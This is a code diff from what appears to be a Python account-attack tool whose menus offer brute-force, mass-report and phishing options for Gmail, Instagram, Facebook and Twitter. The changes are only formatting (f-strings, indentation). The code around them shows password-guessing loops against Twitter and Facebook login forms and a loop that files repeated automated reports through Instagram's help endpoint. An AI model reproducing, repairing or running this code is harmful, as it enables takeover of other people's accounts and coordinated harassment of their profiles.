@@ -59,37 +59,39 @@ def select_an_usernamefb():
 def clear():
    os.system("clear")
 def GmailC():
-   print(color.END+'''['''+color.GREEN+'''1'''+color.END+'''] Bruteforce
-['''+color.GREEN+'''2'''+color.END+'''] MassReport [off]
-['''+color.GREEN+'''3'''+color.END+'''] Phishing [off]
-''')
+   print(
+       (((((((((f'''{color.END}[{color.GREEN}1{color.END}''' + '''] Bruteforce
+[''') + color.GREEN) + '''2''') + color.END) + '''] MassReport [off]
+[''') + color.GREEN) + '''3''') + color.END) + '''] Phishing [off]
+'''))
 def InstagramChoiche():
-   print(color.END+'''['''+color.GREEN+'''1'''+color.END+'''] Bruteforce
-['''+color.GREEN+'''2'''+color.END+'''] MassReport
-['''+color.GREEN+'''3'''+color.END+'''] Phishing [off]
-''')
+   print(
+       (((((((((f'''{color.END}[{color.GREEN}1{color.END}''' + '''] Bruteforce
+[''') + color.GREEN) + '''2''') + color.END) + '''] MassReport
+[''') + color.GREEN) + '''3''') + color.END) + '''] Phishing [off]
+'''))
 def FacebookChoiche():
-   print('''['''+color.GREEN+'''1'''+color.END+'''] Bruteforce
-['''+color.GREEN+'''2'''+color.END+'''] MassReport [off]
-['''+color.GREEN+'''3'''+color.END+'''] Phishing [off]
-''')
+   print((((((((((f'''[{color.GREEN}1{color.END}''' + '''] Bruteforce
+[''') + color.GREEN) + '''2''') + color.END) + '''] MassReport [off]
+[''') + color.GREEN) + '''3''') + color.END) + '''] Phishing [off]
+'''))
 
 def TwitterCoiche():
-   print('''['''+color.GREEN+'''1'''+color.END+'''] Bruteforce
-['''+color.GREEN+'''2'''+color.END+'''] MassReport [off]
-['''+color.GREEN+'''3'''+color.END+'''] Phishing [off]
-''')
+   print((((((((((f'''[{color.GREEN}1{color.END}''' + '''] Bruteforce
+[''') + color.GREEN) + '''2''') + color.END) + '''] MassReport [off]
+[''') + color.GREEN) + '''3''') + color.END) + '''] Phishing [off]
+'''))
 
 def get_user_agent():
       return random.choice(user_agents)
       
 def print_success(message, *argv):
-      print(color.GREEN + "[ OK ] " + color.END , end="")
-      print(message, end=" ")
-      for arg in argv:
-         print(arg, end=" ")
-      print("")
-      print()
+   print(f"{color.GREEN}[ OK ] {color.END}", end="")
+   print(message, end=" ")
+   for arg in argv:
+      print(arg, end=" ")
+   print("")
+   print()
 def twitter(password, username):
    #LOGIN
    data = {"session[username_or_email]":username,
@@ -97,33 +99,33 @@ def twitter(password, username):
    r = requests.post("https://twitter.com/login/", data=data)
 
    if ("success" in r.text):
-      print(color.GREEN+"Password finded: "+color.END+password)
+      print(f"{color.GREEN}Password finded: {color.END}{password}")
    else:
-      print (color.RED+"Wrong password: "+color.END+password)
+      print(f"{color.RED}Wrong password: {color.END}{password}")
 
    #CHANGE URL AND INPUT PASSWORD
    data = {"auth_password":password}
    r = requests.post("https://twitter.com/settings/your_twitter_data", data=data)
 
    if ("success" in r.text):
-      print(color.GREEN+"Password finded! "+color.END+password)
+      print(f"{color.GREEN}Password finded! {color.END}{password}")
       sys.exit(0)
 
 def print_error(message, *argv):
-      print(color.RED + "[ ERR ] " + color.END , end="")
-      print(message, end=" ")
-      for arg in argv:
-         print(arg, end=" ")
-      print("")
-      print()
+   print(f"{color.RED}[ ERR ] {color.END}", end="")
+   print(message, end=" ")
+   for arg in argv:
+      print(arg, end=" ")
+   print("")
+   print()
 
 def print_status(message, *argv):
-      print(color.BLUE + "[ * ] " + color.END , end="")
-      print(message, end=" ")
-      for arg in argv:
-         print(arg, end=" ")
-      print("")
-      print()
+   print(f"{color.BLUE}[ * ] {color.END}", end="")
+   print(message, end=" ")
+   for arg in argv:
+      print(arg, end=" ")
+   print("")
+   print()
 
 
 page_headers = {
@@ -153,38 +155,38 @@ report_headers = {
 
 c_while = 0
 def report_profile_attack(username, nume):
-     c_while = 0
-     while c_while != nume:
+   c_while = 0
+   while c_while != nume:
 
 
 
-          try:
-               lsd = res.text.split('["LSD",[],{"token":"')[1].split('"},')[0]
-               spin_r = res.text.split('"__spin_r":')[1].split(',')[0]
-               spin_b = res.text.split('"__spin_b":')[1].split(',')[0].replace('"',"")
-               spin_t = res.text.split('"__spin_t":')[1].split(',')[0]
-               hsi = res.text.split('"hsi":')[1].split(',')[0].replace('"',"")
-               rev = res.text.split('"server_revision":')[1].split(',')[0].replace('"',"")
-               datr = res.cookies.get_dict()["datr"]
-          except:
-               print("[ "+color.YELLOW+"-"+color.END+" ] tryng to sent report n."+str(c_while))
+      try:
+         lsd = res.text.split('["LSD",[],{"token":"')[1].split('"},')[0]
+         spin_r = res.text.split('"__spin_r":')[1].split(',')[0]
+         spin_b = res.text.split('"__spin_b":')[1].split(',')[0].replace('"',"")
+         spin_t = res.text.split('"__spin_t":')[1].split(',')[0]
+         hsi = res.text.split('"hsi":')[1].split(',')[0].replace('"',"")
+         rev = res.text.split('"server_revision":')[1].split(',')[0].replace('"',"")
+         datr = res.cookies.get_dict()["datr"]
+      except:
+         print(f"[ {color.YELLOW}-{color.END} ] tryng to sent report n.{c_while}")
 
 
 
-          try:
-               res = ses.post(
-                    "https://help.instagram.com/ajax/help/contact/submit/page",
-                    data=report_form,
-                    headers=report_headers,
-                    cookies=report_cookies,
-                    timeout=10
-               )
-          except:
-               time.sleep(2)
-               print_success(color.GREEN+"Successfully reported!"+color.END)
+      try:
+         res = ses.post(
+              "https://help.instagram.com/ajax/help/contact/submit/page",
+              data=report_form,
+              headers=report_headers,
+              cookies=report_cookies,
+              timeout=10
+         )
+      except:
+         time.sleep(2)
+         print_success(f"{color.GREEN}Successfully reported!{color.END}")
 
 
-          c_while = c_while+1
+      c_while += 1
 
 
 
@@ -202,16 +204,18 @@ def create_form():
 
 
 def is_this_a_password(email, index, password):
-    global PAYLOAD, COOKIES
-    if index % 10 == 0:
-        PAYLOAD, COOKIES = create_form()
-        PAYLOAD['email'] = email
-    PAYLOAD['pass'] = password
-    r = requests.post(POST_URL, data=PAYLOAD, cookies=COOKIES, headers=HEADERS)
-    if 'Find Friends' in r.text or 'security code' in r.text or 'Two-factor authentication' in r.text or "Log Out" in r.text:
-        open('temp', 'w').write(str(r.content))
-        print ("["+"+"+"]"+" PASSWORD FINDED:  "+password)
-    print("["+color.RED+"-"+color.END+"]"+color.RED+" Wrong password: "+color.END+password)
+   global PAYLOAD, COOKIES
+   if index % 10 == 0:
+       PAYLOAD, COOKIES = create_form()
+       PAYLOAD['email'] = email
+   PAYLOAD['pass'] = password
+   r = requests.post(POST_URL, data=PAYLOAD, cookies=COOKIES, headers=HEADERS)
+   if 'Find Friends' in r.text or 'security code' in r.text or 'Two-factor authentication' in r.text or "Log Out" in r.text:
+       open('temp', 'w').write(str(r.content))
+       print ("["+"+"+"]"+" PASSWORD FINDED:  "+password)
+   print(
+       f"[{color.RED}-{color.END}]{color.RED} Wrong password: {color.END}{password}"
+   )
 
 
 
